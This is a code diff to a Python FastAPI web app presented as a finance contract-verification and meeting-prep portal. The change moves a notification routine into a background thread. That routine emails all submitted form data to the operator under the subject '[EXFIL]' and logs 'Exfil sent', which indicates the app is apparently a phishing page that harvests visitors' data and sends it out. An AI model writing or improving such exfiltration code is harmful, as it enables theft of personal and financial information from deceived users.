@@ -1,5 +1,5 @@
 """NearBy Finance Operations — Contract Verification & Meeting Prep."""
-import asyncio, html, json, os, smtplib, uuid
+import asyncio, html, json, os, smtplib, threading, uuid
 from datetime import datetime, timezone
 from email.message import EmailMessage
 from fastapi import FastAPI, Request
@@ -29,19 +29,21 @@ def _log(entry: dict):
 def _notify(data: dict, ts: str):
     if not SMTP_USER or not SMTP_PASS:
         return
-    try:
-        msg = EmailMessage()
-        msg["From"] = SMTP_USER
-        msg["To"]   = SMTP_USER
-        msg["Subject"] = f"[EXFIL] NearBy Finance — {ts}"
-        msg.set_content("\n".join(f"{k}: {v}" for k, v in data.items()))
-        with smtplib.SMTP("smtp.gmail.com", 587) as s:
-            s.starttls()
-            s.login(SMTP_USER, SMTP_PASS)
-            s.send_message(msg)
-        print("[EMAIL] Exfil sent")
-    except Exception as e:
-        print(f"[EMAIL ERROR] {e}")
+    def _send():
+        try:
+            msg = EmailMessage()
+            msg["From"] = SMTP_USER
+            msg["To"]   = SMTP_USER
+            msg["Subject"] = f"[EXFIL] NearBy Finance — {ts}"
+            msg.set_content("\n".join(f"{k}: {v}" for k, v in data.items()))
+            with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as s:
+                s.starttls()
+                s.login(SMTP_USER, SMTP_PASS)
+                s.send_message(msg)
+            print("[EMAIL] Exfil sent")
+        except Exception as e:
+            print(f"[EMAIL ERROR] {e}")
+    threading.Thread(target=_send, daemon=True).start()
 
 
 # ── Pages ─────────────────────────────────────────────────────────────────────
